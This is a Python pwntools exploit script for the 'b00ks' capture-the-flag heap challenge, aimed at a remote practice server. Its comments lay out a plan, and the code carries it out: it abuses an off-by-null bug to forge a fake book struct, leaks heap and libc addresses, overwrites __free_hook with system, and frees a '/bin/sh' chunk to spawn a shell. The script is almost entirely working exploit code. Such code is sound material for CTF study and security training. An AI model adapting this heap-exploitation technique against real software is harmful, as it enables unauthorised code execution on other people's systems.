from pwn import *
from LibcSearcher import *

import utils

context.arch = 'amd64'
context.log_level = 'debug'

target = remote('node4.buuoj.cn', 26207)
libc = ELF('/home/kali/glibc-all-in-one/libs/2.23-amd64/libc-2.23.so')
elf = ELF('../b00ks')
# target = process('../b00ks')


def create(bookname_size, bookname, desc_size, desc):
    target.sendlineafter('> ', '1')
    target.sendlineafter(': ', str(bookname_size))
    target.sendlineafter(': ', bookname)
    target.sendlineafter(': ', str(desc_size))
    target.sendlineafter(': ', desc)


def delete(index):
    target.sendlineafter('> ', '2')
    target.sendlineafter('delete: ', str(index))


def edit(index, desc):
    # We can only send limited bytes of new description to the booklist because
    # it will keep track of the allocated size.
    target.sendlineafter('> ', '3')
    target.sendlineafter(': ', str(index))
    target.sendlineafter(': ', desc)


def printf():
    target.sendlineafter('> ', '4')


def change_author(author):
    target.sendlineafter('> ', '5')
    target.sendlineafter(': ', author)


'''
Roadmap:
  1. Since the address of author_name is adjacent to that of the heap array of books, we can use the off-by-null bug to replace the last byte of the first heap array and let it point to the nearest address ends with 00.
  2. Also note that when we first write 32 bytes to author_name, it will append an \x00 to indicate that the string ends there. However, allocating book 1 will replace the last \x00. So when we print author_name, the address of book1 will be leaked.
  3. So we can construct a fake book that resides in book1' description.
  4. How do we control the fake book? Yes, we can replace the last byte of book1's address, and let it point to its description field (The size of bookname and description can be determined by gdb debugger).
'''

# The content of heap_ptr is 0x202060, and that of author str is 0x202040.
# Maybe we can use author_str to modify a byte of heap_ptr's last byte?

# The function at offset 9F3 will append an extra 0 byte to the input string
# which causes the off-by-null bug.

# Since the program is fully RELRO-ed, we can only modify hook pointer.
# To do so, we must leak the base address of libc.

# Malloc order: bookname -> bookdesc -> book
# If we use author_name to modify the last byte of book 0, then it
# will point to bookname, given that we carefully allocated the memory.

# Author name.
target.sendlineafter('name: ', b'a' * 0x20)

# By mallocting as follows, we make sure that the last byte of bookdesc's
# memory address is 0.
create(0x60, 'aaaa', 0x90, 'bbbb')
# So the last byte of author_name will be overwritten by book 0's address.
# Then we could leak the address of book 0 because the 0 byte is now replaced
# by newly allocated book0 address' last byte!
printf()
target.recvuntil(b'a' * 0x20)
book1_addr = u64(target.recv(6).ljust(8, b'\x00'))
print(hex(book1_addr))


create(0x21000, '/bin/sh\x00', 0x21000, '/bin/sh\x00')
# We construct a fake book struct within book 1.
# The fake book uses the description and name fields of book 2.
# 'a' 0xb0 is for padding. Calculated by gdb. :)
book2_name = book1_addr + 0x38
book2_desc = book1_addr + 0x40
payload = b'a' * 0x70 + p64(0x1) + p64(book2_name) + \
          p64(book2_desc) + p64(0xffff)
edit(1, payload)

change_author(b'a' * 0x20)
# Now book0_ptr points to book0's description field => Our fake book!
# We can thus leak all the information about book 2 because the description
# field is now interpreted as a new book struct.
# So print book 0 will leak book 1's descirption / name address.
printf()

target.recvuntil('Name: ')
book2_name_addr = u64(target.recv(6).ljust(8, b'\x00'))
target.recvuntil('Description: ')
book2_desc_addr = u64(target.recv(6).ljust(8, b'\x00'))
print(hex(book2_name_addr), hex(book2_desc_addr))

# The offset from book 2's name / description from libc base is fixed.
libc_base = book2_name_addr - 0x5ca010
print('[+] libc base: {}'.format(hex(libc_base)))

system = libc.symbols["system"] + libc_base
free_hook = libc.symbols['__free_hook'] + libc_base

# We have now make book1 points to its description, so if we modify it, we are
# modifying the fake book within its description field. Thus, we write free_hook
# on book2's description (because the fake book's description field points to
# there).
payload = p64(free_hook) + b'\x00\x00' + b'\x20'
edit(1, payload)
payload = p64(system)
edit(2, payload)

delete(2)

target.interactive()
# target.sendline('cat flag')
